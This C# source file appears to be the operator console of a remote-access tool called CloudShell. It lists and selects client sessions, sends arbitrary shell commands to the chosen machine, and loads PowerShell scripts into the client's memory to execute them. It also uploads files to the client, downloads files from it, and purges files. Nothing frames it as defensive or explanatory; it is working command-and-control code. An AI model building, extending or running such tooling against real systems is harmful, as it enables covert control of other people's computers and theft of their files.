using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CloudShell__Server
{
    class CommandHandler
    {
        private ISessionManager__Server session_manager;
        private Dictionary<string, Action<string>> command_dict;
        private Dictionary<string, string> command_help_dict;
        private Dictionary<Guid, string> command_history_dict;
        public CommandHandler(ISessionManager__Server s_manager)
        {
            session_manager = s_manager;

            command_dict = new Dictionary<string, Action<string>>()
            {
                { "sessions", HandleSessionsCommand },
                { "purge", HandlePurgeCommand },
                { "help", HandleHelpCommand },
                { "loadscript", HandleLoadScriptCommand },
                { "upload", HandleUploadCommand },
                { "download", HandleDownloadCommand }
            };

            command_help_dict = new Dictionary<string, string>()
            {
                { "sessions", "list (sessions list),  select (sessions set <name>) or kill (sessions kill <name>) sessions" },
                { "purge", "remove all files and clean root directory" },
                { "help", "show all possible commands (help) or extended info about one (help <command>)" },
                { "loadscript", "load (loadscript <filename.ps1>) PowerShell script into client's memory and execute it" },
                { "upload", "upload file to remote client (upload <filename>)" },
                { "download", "download file from remote site (download <filename>)" }

            };

            command_history_dict = new Dictionary<Guid, string>();

            StartResultsCheckingThread();
        }

        private void StartResultsCheckingThread()
        {
            new Thread(() =>
            {
            Thread.CurrentThread.IsBackground = true;
            while (true)
            {
                if (session_manager.GetCurrentSession() != null)
                {
                    List<Record> record_list = session_manager.GetRecords();
                    if (record_list.Count != 0)
                    {
                        Console.WriteLine();
                        foreach (var record in record_list)
                        {
                            if (record.Type == RecordType.CommandResult || record.Type == RecordType.LoadScriptResult
                                    || record.Type == RecordType.UploadFileResult)
                            {
                                Console.WriteLine("> " + command_history_dict[record.Guid] + " ==> " + record.Content);
                            }

                            if (record.Type == RecordType.DownloadFileResult)
                            {
                                string filename = record.Content.Split(':')[0];
                                byte[] data = Record.Base64Decode_b(record.Content.Split(':')[1]);

                                File.WriteAllBytes(AppDomain.CurrentDomain.BaseDirectory + filename, data);
                                Console.WriteLine("> " + command_history_dict[record.Guid] + " ==> " + record.Content.Split(':')[0]);
                            }
                            }
                            Console.Write("> ");
                        }
                    }
                }
            }).Start();
        }

        public void HandleCommand()
        {
            Console.Write("> ");
            string command = Console.ReadLine();
            if (command.Length == 0)
                return;

            List<string> implied_commands = command_dict.Keys.ToList();
            foreach(string implied_command in implied_commands)
            {
                if(command.StartsWith(implied_command))
                {
                    command_dict[implied_command](command);
                    return;
                }
            }

            HandleCmdCommand(command);
        }

        private void HandleHelpCommand(string command)
        {
            string help = "";
            if (command.Split(' ').Length == 1)
            {
                help = "Available commands:" + Environment.NewLine;
                foreach (var key in command_help_dict.Keys.ToList())
                    help = help + key + " ";
            } else
            {
                string command_help = command.Split(' ')[1];
                if (command_help_dict.Keys.ToList().Contains(command_help))
                    help = command_help_dict[command_help];
                else
                    help = "No help for " + command_help;
            }

            Console.WriteLine(help);
        }
        private void HandleSessionsCommand(string command)
        {
            string[] args = command.Split(' ');
            if (args.Length == 1)
            {
                Console.WriteLine("Try 'help sessions'");
                return;
            }

            string sessions_command = args[1];
            if(sessions_command == "list")
            {                
                List<string> sessions = session_manager.GetSessions();
                if(sessions.Count == 0)
                {
                    Console.WriteLine("No sessions available");
                    return;
                }

                foreach (string session in sessions)
                    Console.WriteLine(session);

                return;
            }

            if(sessions_command == "set")
            {
                if(args.Length != 3)
                {
                    Console.WriteLine("Try 'help sessions'");
                    return;
                }

                string session = args[2];
                List<string> sessions = session_manager.GetSessions();

                if(sessions.Contains(session))
                {
                    Console.WriteLine("Using session " + session);
                    session_manager.SetCurrentSession(session);
                } else
                {
                    Console.WriteLine("Session " + session + " is not available for use");
                }

                return;
            }

            if (sessions_command == "kill")
            {
                Console.WriteLine("Not implemented yet, sorry :(");

                return;
            }

        }
        private void HandlePurgeCommand(string command)
        {
            session_manager.Purge();
        }
        private void HandleLoadScriptCommand(string command)
        {
            string filename = command.Split(' ')[1];
            string file_content;
           
            file_content = File.ReadAllText(filename);

            if (session_manager.GetCurrentSession() != null)
            {
                Record r = new Record(Guid.NewGuid(), RecordType.LoadScript, file_content);
                command_history_dict.Add(r.Guid, filename);
                session_manager.UploadRecord(r);
            }
            else
            {
                Console.WriteLine("You should set session first");
            }
        }

        private void HandleUploadCommand(string command)
        {
            string filename = command.Replace("upload ", "");
            string rel_filename = filename.Split('\\')[filename.Split('\\').Length - 1];

            Record file = new Record(Guid.NewGuid(), RecordType.UploadFile, rel_filename + ":" + Record.Base64Encode_b(File.ReadAllBytes(filename)));

            command_history_dict.Add(file.Guid, command);

            session_manager.UploadRecord(file);
        }
        private void HandleDownloadCommand(string command)
        {
            string filename = command.Replace("download ", "");

            Record file = new Record(Guid.NewGuid(), RecordType.DownloadFile, filename);

            command_history_dict.Add(file.Guid, command);
            session_manager.UploadRecord(file);
        }
        private void HandleCmdCommand(string command)
        {
            if (session_manager.GetCurrentSession() != null)
            {
                Record r = new Record(Guid.NewGuid(), RecordType.Command, command);
                command_history_dict.Add(r.Guid, r.Content);
                session_manager.UploadRecord(r);
            }
            else
            {
                Console.WriteLine("You should set session first");
            }
        }
    }
}
